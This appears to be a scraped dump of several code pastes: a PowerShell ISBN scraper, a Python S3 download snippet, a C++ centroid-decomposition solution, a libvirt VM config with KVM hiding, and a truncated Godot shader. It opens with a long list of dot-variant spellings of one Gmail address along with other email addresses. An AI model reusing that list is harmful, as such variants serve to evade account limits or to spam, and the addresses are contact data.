<a href=""mailto:vi.sa.in.c.usa.8.9.3@gmail.com"">vi.sa.in.c.usa.8.9.3@gmail.com</a>
<a href=""mailto:vi.sainc.u.sa.893@gmail.com"">vi.sainc.u.sa.893@gmail.com</a>
<a href=""mailto:v.i.s.a.i.n.cu.s.a.8.9.3@gmail.com"">v.i.s.a.i.n.cu.s.a.8.9.3@gmail.com</a>
<a href=""mailto:vis.ai.n.cu.s.a.8.93@gmail.com"">vis.ai.n.cu.s.a.8.93@gmail.com</a>
<a href=""mailto:v.isai.nc.u.sa.8.9.3@gmail.com"">v.isai.nc.u.sa.8.9.3@gmail.com</a>
<a href=""mailto:vi.sain.c.u.sa.8.93@gmail.com"">vi.sain.c.u.sa.8.93@gmail.com</a>
<a href=""mailto:v.isai.ncusa.8.93@gmail.com"">v.isai.ncusa.8.93@gmail.com</a>
<a href=""mailto:v.i.sa.i.ncu.s.a.89.3@gmail.com"">v.i.sa.i.ncu.s.a.89.3@gmail.com</a>
<a href=""mailto:v.i.sainc.u.sa8.9.3@gmail.com"">v.i.sainc.u.sa8.9.3@gmail.com</a>
<a href=""mailto:vis.ain.cus.a8.93@gmail.com"">vis.ain.cus.a8.93@gmail.com</a>
<a href=""mailto:v.isaincusa8.9.3@gmail.com"">v.isaincusa8.9.3@gmail.com</a>
<a href=""mailto:v.i.s.ain.c.us.a.8.9.3@gmail.com"">v.i.s.ain.c.us.a.8.9.3@gmail.com</a>
<a href=""mailto:v.isa.i.n.c.u.sa8.93@gmail.com"">v.isa.i.n.c.u.sa8.93@gmail.com</a>
<a href=""mailto:vi.sa.i.n.cu.sa.893@gmail.com"">vi.sa.i.n.cu.sa.893@gmail.com</a>
<a href=""mailto:v.i.sa.inc.u.s.a89.3@gmail.com"">v.i.sa.inc.u.s.a89.3@gmail.com</a>
<a href=""mailto:vis.aincusa.89.3@gmail.com"">vis.aincusa.89.3@gmail.com</a>
<a href=""mailto:v.isa.i.n.c.u.s.a.8.9.3@gmail.com"">v.isa.i.n.c.u.s.a.8.9.3@gmail.com</a>
<a href=""mailto:vis.a.incu.sa.8.9.3@gmail.com"">vis.a.incu.sa.8.9.3@gmail.com</a>
<a href=""mailto:vi.saincu.s.a893@gmail.com"">vi.saincu.s.a893@gmail.com</a>
<a href=""mailto:visainc.u.s.a8.93@gmail.com"">visainc.u.s.a8.93@gmail.com</a>
<a href=""mailto:vi.s.a.i.n.cu.sa.89.3@gmail.com"">vi.s.a.i.n.cu.sa.89.3@gmail.com</a>
<a href=""mailto:vi.s.aincu.s.a.893@gmail.com"">vi.s.aincu.s.a.893@gmail.com</a>
<a href=""mailto:vi.sain.cus.a.893@gmail.com"">vi.sain.cus.a.893@gmail.com</a>
<a href=""mailto:v.i.sa.i.nc.us.a.8.9.3@gmail.com"">v.i.sa.i.nc.us.a.8.9.3@gmail.com</a>
<a href=""mailto:visa.inc.u.sa893@gmail.com"">visa.inc.u.sa893@gmail.com</a>
<a href=""mailto:vis.ai.ncu.s.a.89.3@gmail.com"">vis.ai.ncu.s.a.89.3@gmail.com</a>
<a href=""mailto:visai.n.cu.sa89.3@gmail.com"">visai.n.cu.sa89.3@gmail.com</a>
<a href=""mailto:v.i.s.a.i.n.cu.s.a.8.93@gmail.com"">v.i.s.a.i.n.cu.s.a.8.93@gmail.com</a>
<a href=""mailto:vis.ai.n.cu.sa8.9.3@gmail.com"">vis.ai.n.cu.sa8.9.3@gmail.com</a>
<a href=""mailto:vi.sa.i.ncu.sa.893@gmail.com"">vi.sa.i.ncu.sa.893@gmail.com</a>
<a href=""mailto:v.i.sainc.u.s.a.893@gmail.com"">v.i.sainc.u.s.a.893@gmail.com</a>
<a href=""mailto:v.i.sain.c.u.sa8.93@gmail.com"">v.i.sain.c.u.sa8.93@gmail.com</a>
<a href=""mailto:v.i.s.a.i.n.c.u.s.a89.3@gmail.com"">v.i.s.a.i.n.c.u.s.a89.3@gmail.com</a>
<a href=""mailto:vis.a.in.c.usa8.93@gmail.com"">vis.a.in.c.usa8.93@gmail.com</a>
<a href=""mailto:v.is.a.i.nc.usa.89.3@gmail.com"">v.is.a.i.nc.usa.89.3@gmail.com</a>
<a href=""mailto:v.i.sai.ncusa8.93@gmail.com"">v.i.sai.ncusa8.93@gmail.com</a>
<a href=""mailto:v.isai.n.cu.s.a.8.9.3@gmail.com"">v.isai.n.cu.s.a.8.9.3@gmail.com</a>
<a href=""mailto:v.is.a.in.c.u.s.a.89.3@gmail.com"">v.is.a.in.c.u.s.a.89.3@gmail.com</a>
<a href=""mailto:v.isai.n.cusa89.3@gmail.com"">v.isai.n.cusa89.3@gmail.com</a>
<a href=""mailto:v.i.sa.in.cusa89.3@gmail.com"">v.i.sa.in.cusa89.3@gmail.com</a>
<a href=""mailto:v.is.a.i.n.cusa8.9.3@gmail.com"">v.is.a.i.n.cusa8.9.3@gmail.com</a>
<a href=""mailto:v.is.ai.ncus.a89.3@gmail.com"">v.is.ai.ncus.a89.3@gmail.com</a>
<a href=""mailto:vis.a.incu.sa893@gmail.com"">vis.a.incu.sa893@gmail.com</a>
<a href=""mailto:v.isa.inc.u.sa89.3@gmail.com"">v.isa.inc.u.sa89.3@gmail.com</a>
<a href=""mailto:v.i.sai.ncu.sa89.3@gmail.com"">v.i.sai.ncu.sa89.3@gmail.com</a>
<a href=""mailto:vi.sa.inc.usa.8.9.3@gmail.com"">vi.sa.inc.usa.8.9.3@gmail.com</a>
<a href=""mailto:vis.ainc.u.s.a.8.9.3@gmail.com"">vis.ainc.u.s.a.8.9.3@gmail.com</a>
<a href=""mailto:v.is.ainc.u.sa893@gmail.com"">v.is.ainc.u.sa893@gmail.com</a>
<a href=""mailto:v.i.sai.n.cus.a.8.93@gmail.com"">v.i.sai.n.cus.a.8.93@gmail.com</a>
<a href=""mailto:v.i.sa.in.c.us.a8.9.3@gmail.com"">v.i.sa.in.c.us.a8.9.3@gmail.com</a>
<a href=""mailto:vis.ai.ncu.sa8.93@gmail.com"">vis.ai.ncu.sa8.93@gmail.com</a>
<a href=""mailto:vi.sa.i.n.c.u.s.a.8.93@gmail.com"">vi.sa.i.n.c.u.s.a.8.93@gmail.com</a>
<a href=""mailto:vi.sai.ncu.sa8.9.3@gmail.com"">vi.sai.ncu.sa8.9.3@gmail.com</a>
<a href=""mailto:v.i.sai.n.c.u.sa.89.3@gmail.com"">v.i.sai.n.c.u.sa.89.3@gmail.com</a>
<a href=""mailto:v.i.sain.c.us.a89.3@gmail.com"">v.i.sain.c.us.a89.3@gmail.com</a>
<a href=""mailto:v.is.ai.ncusa.8.9.3@gmail.com"">v.is.ai.ncusa.8.9.3@gmail.com</a>
<a href=""mailto:vi.sa.in.cusa89.3@gmail.com"">vi.sa.in.cusa89.3@gmail.com</a>
<a href=""mailto:vis.ain.cus.a89.3@gmail.com"">vis.ain.cus.a89.3@gmail.com</a>
<a href=""mailto:vi.sa.i.n.cusa893@gmail.com"">vi.sa.i.n.cusa893@gmail.com</a>
<a href=""mailto:v.isa.i.n.cu.sa89.3@gmail.com"">v.isa.i.n.cu.sa89.3@gmail.com</a>
<a href=""mailto:v.isai.n.c.us.a.893@gmail.com"">v.isai.n.c.us.a.893@gmail.com</a>
<a href=""mailto:v.isainc.u.s.a.8.93@gmail.com"">v.isainc.u.s.a.8.93@gmail.com</a>
<a href=""mailto:v.i.saincu.sa.8.9.3@gmail.com"">v.i.saincu.sa.8.9.3@gmail.com</a>
<a href=""mailto:visa.incus.a.893@gmail.com"">visa.incus.a.893@gmail.com</a>
<a href=""mailto:vis.ainc.usa.8.93@gmail.com"">vis.ainc.usa.8.93@gmail.com</a>
<a href=""mailto:vi.sa.i.n.c.us.a.8.9.3@gmail.com"">vi.sa.i.n.c.us.a.8.9.3@gmail.com</a>
<a href=""mailto:vi.s.a.i.n.c.usa8.93@gmail.com"">vi.s.a.i.n.c.usa8.93@gmail.com</a>
<a href=""mailto:v.i.s.ai.ncu.sa.8.9.3@gmail.com"">v.i.s.ai.ncu.sa.8.9.3@gmail.com</a>
<a href=""mailto:v.isainc.u.s.a.89.3@gmail.com"">v.isainc.u.s.a.89.3@gmail.com</a>
<a href=""mailto:vis.ain.cusa.893@gmail.com"">vis.ain.cusa.893@gmail.com</a>
<a href=""mailto:v.i.sai.n.c.us.a.89.3@gmail.com"">v.i.sai.n.c.us.a.89.3@gmail.com</a>
<a href=""mailto:v.i.sain.c.us.a.893@gmail.com"">v.i.sain.c.us.a.893@gmail.com</a>
<a href=""mailto:v.i.s.ainc.u.s.a8.9.3@gmail.com"">v.i.s.ainc.u.s.a8.9.3@gmail.com</a>
<a href=""mailto:vi.s.ain.c.u.sa.893@gmail.com"">vi.s.ain.c.u.sa.893@gmail.com</a>
<a href=""mailto:v.i.s.ain.cu.sa8.9.3@gmail.com"">v.i.s.ain.cu.sa8.9.3@gmail.com</a>
<a href=""mailto:visaincusa8.9.3@gmail.com"">visaincusa8.9.3@gmail.com</a>
<a href=""mailto:v.is.ai.ncu.s.a8.9.3@gmail.com"">v.is.ai.ncu.s.a8.9.3@gmail.com</a>
<a href=""mailto:v.i.sainc.usa89.3@gmail.com"">v.i.sainc.usa89.3@gmail.com</a>
<a href=""mailto:visai.n.cu.sa.893@gmail.com"">visai.n.cu.sa.893@gmail.com</a>
<a href=""mailto:v.isai.ncus.a.8.9.3@gmail.com"">v.isai.ncus.a.8.9.3@gmail.com</a>
<a href=""mailto:visai.n.cus.a8.9.3@gmail.com"">visai.n.cus.a8.9.3@gmail.com</a>
<a href=""mailto:visai.ncu.sa893@gmail.com"">visai.ncu.sa893@gmail.com</a>
<a href=""mailto:v.is.ain.cusa.893@gmail.com"">v.is.ain.cusa.893@gmail.com</a>
<a href=""mailto:v.is.a.i.nc.u.sa.8.9.3@gmail.com"">v.is.a.i.nc.u.sa.8.9.3@gmail.com</a>
<a href=""mailto:vis.ain.cu.sa8.9.3@gmail.com"">vis.ain.cu.sa8.9.3@gmail.com</a>
<a href=""mailto:vis.ain.c.u.s.a.8.93@gmail.com"">vis.ain.c.u.s.a.8.93@gmail.com</a>
<a href=""mailto:visaincu.sa8.93@gmail.com"">visaincu.sa8.93@gmail.com</a>
<a href=""mailto:v.isainc.u.sa8.93@gmail.com"">v.isainc.u.sa8.93@gmail.com</a>
<a href=""mailto:vi.s.a.in.c.us.a.8.9.3@gmail.com"">vi.s.a.in.c.us.a.8.9.3@gmail.com</a>
<a href=""mailto:vis.a.in.c.u.s.a.8.9.3@gmail.com"">vis.a.in.c.u.s.a.8.9.3@gmail.com</a>
<a href=""mailto:vi.sai.n.c.usa.8.93@gmail.com"">vi.sai.n.c.usa.8.93@gmail.com</a>
<a href=""mailto:vi.s.ai.n.cusa8.9.3@gmail.com"">vi.s.ai.n.cusa8.9.3@gmail.com</a>
<a href=""mailto:visai.n.cusa89.3@gmail.com"">visai.n.cusa89.3@gmail.com</a>
<a href=""mailto:vi.s.ai.n.c.u.sa.89.3@gmail.com"">vi.s.ai.n.c.u.sa.89.3@gmail.com</a>
<a href=""mailto:v.i.sa.i.nc.u.s.a89.3@gmail.com"">v.i.sa.i.nc.u.s.a89.3@gmail.com</a>
<a href=""mailto:vi.s.ai.ncu.sa893@gmail.com"">vi.s.ai.ncu.sa893@gmail.com</a>
<a href=""mailto:v.is.ai.nc.usa.893@gmail.com"">v.is.ai.nc.usa.893@gmail.com</a>
<a href=""mailto:vis.ai.n.cus.a.8.9.3@gmail.com"">vis.ai.n.cus.a.8.9.3@gmail.com</a>
<a href=""mailto:vis.a.i.nc.usa.8.93@gmail.com"">vis.a.i.nc.usa.8.93@gmail.com</a>
<a href=""mailto:visa.i.n.c.usa893@gmail.com"">visa.i.n.c.usa893@gmail.com</a>
<a href=""mailto:vi.s.aincu.sa89.3@gmail.com"">vi.s.aincu.sa89.3@gmail.com</a>
<a href=""mailto:v.is.a.i.n.c.u.s.a8.9.3@gmail.com"">v.is.a.i.n.c.u.s.a8.9.3@gmail.com</a>
<a href=""mailto:vi.s.a.in.c.usa.89.3@gmail.com"">vi.s.a.in.c.usa.89.3@gmail.com</a>
<a href=""mailto:visa.inc.us.a89.3@gmail.com"">visa.inc.us.a89.3@gmail.com</a>
<a href=""mailto:v.isa.i.n.cu.sa8.93@gmail.com"">v.isa.i.n.cu.sa8.93@gmail.com</a>
<a href=""mailto:vi.sa.i.nc.u.sa.893@gmail.com"">vi.sa.i.nc.u.sa.893@gmail.com</a>
<a href=""mailto:v.is.ai.nc.usa89.3@gmail.com"">v.is.ai.nc.usa89.3@gmail.com</a>
<a href=""mailto:v.isainc.u.s.a8.93@gmail.com"">v.isainc.u.s.a8.93@gmail.com</a>
<a href=""mailto:vis.ai.n.cusa.89.3@gmail.com"">vis.ai.n.cusa.89.3@gmail.com</a>
<a href=""mailto:vi.sain.c.u.sa89.3@gmail.com"">vi.sain.c.u.sa89.3@gmail.com</a>
<a href=""mailto:v.isa.inc.usa.89.3@gmail.com"">v.isa.inc.usa.89.3@gmail.com</a>
<a href=""mailto:v.isaincus.a8.93@gmail.com"">v.isaincus.a8.93@gmail.com</a>
<a href=""mailto:v.isa.i.ncu.s.a.8.9.3@gmail.com"">v.isa.i.ncu.s.a.8.9.3@gmail.com</a>
<a href=""mailto:vi.sai.n.c.u.s.a.893@gmail.com"">vi.sai.n.c.u.s.a.893@gmail.com</a>
<a href=""mailto:v.is.ai.n.cu.sa893@gmail.com"">v.is.ai.n.cu.sa893@gmail.com</a>
<a href=""mailto:v.is.a.i.n.c.u.s.a893@gmail.com"">v.is.a.i.n.c.u.s.a893@gmail.com</a>
<a href=""mailto:visa.i.nc.us.a8.9.3@gmail.com"">visa.i.nc.us.a8.9.3@gmail.com</a>
<a href=""mailto:v.i.sai.n.c.us.a.8.93@gmail.com"">v.i.sai.n.c.us.a.8.93@gmail.com</a>
<a href=""mailto:ac2323fbde7b4384ba0010f6076aa6ca.protect@withheldforprivacy.com"">ac2323fbde7b4384ba0010f6076aa6ca.protect@withheldforprivacy.com</a>
<a href=""mailto:support@fenemoregroup.com"">support@fenemoregroup.com</a>
<a href=""mailto:1f3d906dcb6b4605ae602d29911d9dea.protect@withheldforprivacy.com"">1f3d906dcb6b4605ae602d29911d9dea.protect@withheldforprivacy.com</a>"
rjztwmcp,scrapISBN.ps1,Combreal,PowerShell,Saturday 2nd of March 2024 09:49:56 AM CDT,"$CustomObjs=@()

$ISBN = ""978-2-38275-162-6""
$truncatedISBN = $ISBN -replace '-', ''

$booksHtml = Invoke-WebRequest ""https://isbnsearch.org/isbn/$truncatedISBN""
$bookInfo = $booksHtml.ParsedHtml.getElementsByClassName(""bookinfo"")[0].innerText

$cutBookInfo = $bookInfo.Split([System.Environment]::NewLine,[System.StringSplitOptions]::RemoveEmptyEntries)

$name = $cutBookInfo[0]
$author = $cutBookInfo[3].Substring($cutBookInfo[3].IndexOf("": "") + 2)
$binding = $cutBookInfo[4].Substring($cutBookInfo[4].IndexOf("": "") + 2)
$publisher = $cutBookInfo[5].Substring($cutBookInfo[5].IndexOf("": "") + 2)
$published = $cutBookInfo[6].Substring($cutBookInfo[6].IndexOf("": "") + 2)
$coverLink = $booksHtml.Images[0].src

$CustomObj = New-Object -TypeName PSObject -Property @{ 'Name' = $name; 'ISBN' = $ISBN; ""Author"" = $author; ""Binding"" = $binding; ""Publisher"" = $publisher; ""Published"" = $published; ""Cover"" = $coverLink }
$CustomObjs += $CustomObj

$CustomObjs"
ACTadH2b,Untitled,katerina-bonditka,Python,Saturday 2nd of March 2024 09:43:34 AM CDT,"import requests

# pip install yandex-s3
from s3 import S3Client

aws_access_key_id_student = ""secret""  # <= aws_access_key_id_student
aws_secret_access_key_student = ""secret""  # <= aws_secret_access_key_student
student_s3_bucket = ""s3-student-mle-secret""  # <= student_s3_bucket
region = ""ru-central1""

s3 = S3Client(
    access_key=aws_access_key_id_student,
    secret_key=aws_secret_access_key_student,
    region=region,
    s3_bucket=student_s3_bucket,
)

download_url = s3.signed_download_url(""models/fitted_model.pkl"", max_age=30)
response = requests.get(download_url)

content_logistic = str(response.content).find(""LogisticRegression"")
content_catboost = str(response.content).find(""CatBoostClassifier"")
print(f""is Logistinc: {content_logistic > 0}"")
print(f""is CatBoostClassifier: {content_catboost > 0}"")


# >> is Logistinc: True
# >> is CatBoostClassifier: False"
J8MmQYcN,Olimpijada,VMaksimoski008,C++,Saturday 2nd of March 2024 08:45:27 AM CDT,"#include <bits/stdc++.h>
using namespace std;
using pii = pair<int, int>;
   
const int maxn = 1e5 + 1;
   
struct SegTree {
    int n;
    pii tree[2*maxn+5];
   
    SegTree() {
        n = maxn;
        build();
    }
   
    int val(pii x) {
        return x.first - 2 * x.second;
    }
   
    pii merge(pii a, pii b) {
        if(val(a) < val(b)) return a;
        return b;
    }
   
    void build() {
        for(int i=n; i<2*n; i++) tree[i] = {i-n, -10000000};
        for(int i=n-1; i>0; i--) tree[i] = merge(tree[i<<1], tree[i<<1|1]);
    }
 
    void update(int p, int v) {
        p+=n;
        if(v == -10000000) tree[p].second = v;
        else tree[p].second = max(tree[p].second, v);
        for(; p>1; p>>=1) tree[p>>1] = merge(tree[p], tree[p^1]);
    }
 
    int query(int l, int r) {
        pii ans1 = {1e9, 0}, ans2 = {1e9, 0};
        for(l+=n, r+=n; l <= r; l >>= 1, r >>= 1) {
            if(l & 1) ans1 = merge(ans1, tree[l++]);
            if(r & 1) ans2 = merge(ans2, tree[r--]);
        }
        return val(merge(ans1, ans2));
    }
} tree;
   
int n, L, H, del[maxn], sub[maxn], mid, mx_depth = 0, cen, i;
bool ok = 0;
vector<pii> graph[maxn];
vector<int> comp;
   
int get_sub(int u, int p) {
    sub[u] = 1;
    for(auto &[v, _] : graph[u]) {
        if(v == p || del[v]) continue;
        sub[u] += get_sub(v, u);
    }
    return sub[u];
}
   
int get_cen(int u, int sz, int p) {
    for(auto &[v, _] : graph[u]) {
        if(v == p || del[v]) continue;
        if(2 * sub[v] > sz) return get_cen(v, sz, u);
    }
    return u;
}
   
void dfs(int u, int p, int d, int ones, bool add) {
    if(d > H || ok) return ;
   
    mx_depth = max(mx_depth, d);
   
    if(add) {
        tree.update(d, ones);
    } else if((2 * ones >= d && d >= L) || 2 * ones - d >= tree.query(max(0, L - d), H - d)) {
        ok = 1;
        return ;
    }
   
    for(auto &[v, w] : graph[u]) {
        if(del[v] || v == p) continue;
        dfs(v, u, d + 1, ones + (w >= comp[mid]), add);
    } 
}
 
void build(int u) {
    cen = get_cen(u, get_sub(u, 0), 0);
   
    del[cen] = 1;
     
    for(auto &[v, w] : graph[cen]) {
        if(del[v] || ok) continue;
        dfs(v, cen, 1, (w >= comp[mid]), false);
        tree.update(1, (w >= comp[mid]));
        dfs(v, cen, 1, (w >= comp[mid]), true);
    }
   
    for(i=0; i<=mx_depth; i++) tree.update(i, -10000000);
    mx_depth = 0;
 
    if(ok) return ;
   
    for(auto &[v, _] : graph[cen])
        if(!del[v]) build(v);
}
   
int main() {
    ios_base::sync_with_stdio(false);
    cout.tie(0); cin.tie(0);
   
    cin >> n >> L >> H;
   
    int a, b, w;
    set<int> s;
    for(i=0; i<n-1; i++) {
        cin >> a >> b >> w;
        s.insert(w);
        graph[a].push_back({ b, w });
        graph[b].push_back({ a, w });
    }
   
    comp = vector<int>(s.begin(), s.end());
   
    int l=0, r=comp.size()-1, ans=0;
    while(l <= r) {
        mid = (l + r) / 2;
        ok = 0;
        memset(del, 0, 4*n+4);
        build(1);
        if(ok) ans = mid, l = mid + 1;
        else r = mid - 1;
    }
   
    cout << comp[ans] << '\n';
    return 0;
}"
fvTax4gP,windows11-ryzen5800x-libvirt-xml-12-AVIC+HV+SecureBoot+io_uring+pv-ipi+rebar+rx7900xt,mmcze,XML,Saturday 2nd of March 2024 06:56:43 AM CDT,"<domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
  <name>windows2</name>
  <uuid>3ca72322-a343-32ff-ab2d-119eb4b63e34</uuid>
  <memory unit='KiB'>25165824</memory>
  <currentMemory unit='KiB'>25165824</currentMemory>
  <memoryBacking>
    <hugepages/>
    <nosharepages/>
    <locked/>
  </memoryBacking>
  <vcpu placement='static'>14</vcpu>
  <iothreads>1</iothreads>
  <cputune>
    <vcpupin vcpu='0' cpuset='15'/>
    <vcpupin vcpu='1' cpuset='7'/>
    <vcpupin vcpu='2' cpuset='14'/>
    <vcpupin vcpu='3' cpuset='6'/>
    <vcpupin vcpu='4' cpuset='13'/>
    <vcpupin vcpu='5' cpuset='5'/>
    <vcpupin vcpu='6' cpuset='12'/>
    <vcpupin vcpu='7' cpuset='4'/>
    <vcpupin vcpu='8' cpuset='11'/>
    <vcpupin vcpu='9' cpuset='3'/>
    <vcpupin vcpu='10' cpuset='10'/>
    <vcpupin vcpu='11' cpuset='2'/>
    <vcpupin vcpu='12' cpuset='9'/>
    <vcpupin vcpu='13' cpuset='1'/>
    <emulatorpin cpuset='8'/>
    <iothreadpin iothread='1' cpuset='0'/>
    <emulatorsched scheduler='fifo' priority='10'/>
  </cputune>
  <resource>
    <partition>/machine</partition>
  </resource>
  <os>
    <type arch='x86_64' machine='pc-q35-7.0'>hvm</type>
    <loader readonly='yes' secure='yes' type='pflash'>/usr/share/OVMF/OVMF_CODE_4M.secboot.fd</loader>
    <nvram>/usr/share/OVMF/OVMF_VARS_4M.ms.fd</nvram>
    <bootmenu enable='no'/>
    <smbios mode='host'/>
  </os>
  <features>
    <acpi/>
    <apic eoi='on'/>
    <hap state='on'/>
    <hyperv mode='custom'>
      <relaxed state='on'/>
      <vapic state='on'/>
      <spinlocks state='on' retries='8191'/>
      <vpindex state='on'/>
      <runtime state='on'/>
      <synic state='on'/>
      <stimer state='on'>
        <direct state='on'/>
      </stimer>
      <reset state='on'/>
      <vendor_id state='on' value='1234567890ab'/>
      <frequencies state='on'/>
      <reenlightenment state='on'/>
      <tlbflush state='on'/>
      <ipi state='on'/>
      <avic state='on'/>
    </hyperv>
    <kvm>
      <hidden state='on'/>
      <hint-dedicated state='on'/>
      <poll-control state='on'/>
      <pv-ipi state='on'/>
    </kvm>
    <pmu state='off'/>
    <vmport state='off'/>
    <smm state='on'>
      <tseg unit='MiB'>64</tseg>
    </smm>
    <ioapic driver='kvm'/>
  </features>
  <cpu mode='host-passthrough' check='full' migratable='off'>
    <topology sockets='1' dies='1' cores='7' threads='2'/>
    <cache mode='passthrough'/>
    <feature policy='disable' name='x2apic'/>
    <feature policy='require' name='tsc-deadline'/>
    <feature policy='require' name='tsc_adjust'/>
    <feature policy='require' name='arch-capabilities'/>
    <feature policy='require' name='rdctl-no'/>
    <feature policy='require' name='skip-l1dfl-vmentry'/>
    <feature policy='require' name='mds-no'/>
    <feature policy='require' name='pschange-mc-no'/>
    <feature policy='require' name='topoext'/>
    <feature policy='disable' name='svm'/>
    <feature policy='require' name='hypervisor'/>
    <feature policy='require' name='invtsc'/>
    <feature policy='require' name='ibpb'/>
    <feature policy='require' name='virt-ssbd'/>
    <feature policy='require' name='pdpe1gb'/>
    <feature policy='require' name='cmp_legacy'/>
    <feature policy='require' name='xsaves'/>
    <feature policy='require' name='perfctr_core'/>
    <feature policy='require' name='clzero'/>
    <feature policy='require' name='xsaveerptr'/>
  </cpu>
  <clock offset='timezone' timezone='Europe/Prague'>
    <timer name='rtc' present='no' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='discard'/>
    <timer name='hpet' present='no'/>
    <timer name='kvmclock' present='no'/>
    <timer name='hypervclock' present='yes'/>
    <timer name='tsc' present='yes' mode='native'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>destroy</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/usr/bin/qemu-system-x86_64</emulator>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/crypt/win2-storage/disk.raw'/>
      <backingStore/>
      <target dev='vda' bus='scsi'/>
      <boot order='1'/>
      <address type='drive' controller='0' bus='0' target='0' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/zrcadlo2/win2-storage2/disk.raw'/>
      <backingStore/>
      <target dev='vdb' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='1' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/stripovanej/win2-storage3/disk.raw'/>
      <backingStore/>
      <target dev='vdc' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='2' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool/win2-storage4/disk.raw'/>
      <backingStore/>
      <target dev='vdd' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='3' unit='0'/>
    </disk>
    <controller type='pci' index='0' model='pcie-root'/>
    <controller type='pci' index='1' model='dmi-to-pci-bridge'>
      <model name='i82801b11-bridge'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pci-bridge'>
      <model name='pci-bridge'/>
      <target chassisNr='2'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x10'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x11'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x12'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x13'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='8' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='8' port='0x9'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x1'/>
    </controller>
    <controller type='scsi' index='0' model='virtio-scsi'>
      <driver queues='8' iothread='1'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x2'/>
    </controller>
    <controller type='sata' index='0'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='usb' index='0' model='nec-xhci' ports='6'>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </controller>
    <interface type='bridge'>
      <mac address='52:54:00:46:db:27'/>
      <source bridge='br0'/>
      <model type='virtio'/>
      <driver queues='8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0'/>
    </interface>
    <input type='mouse' bus='ps2'/>
    <input type='keyboard' bus='ps2'/>
    <tpm model='tpm-tis'>
      <backend type='emulator' version='2.0'/>
    </tpm>
    <audio id='1' type='none'/>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x0'/>
      </source>
      <rom file='/usr/share/ovmf/rx7900xt.rom'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0' multifunction='on'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x1'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x2'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x2'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x3'/>
    </hostdev>
    <hostdev mode='subsystem' type='usb' managed='yes'>
      <source>
        <vendor id='0x0458'/>
        <product id='0x6007'/>
        <address bus='3' device='2'/>
      </source>
      <address type='usb' bus='0' port='3'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x2b' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </hostdev>
    <watchdog model='itco' action='reset'/>
    <memballoon model='none'/>
  </devices>
  <seclabel type='dynamic' model='dac' relabel='yes'/>
<qemu:commandline>
<qemu:arg value=""-fw_cfg""/>
<qemu:arg value=""opt/ovmf/X-PciMmio64Mb,string=65536""/>
</qemu:commandline>
</domain>"
bmm9NBwH,Godot 4.x Crosshair shader,Lakamfo,Godot GLSL,Saturday 2nd of March 2024 06:34:42 AM CDT,"shader_type canvas_item;


float shape_polygon(vec2 uv, float sides, float size, float edge) {
	uv = 2.0*uv-1.0;
	edge = max(edge, 1.0e-8);
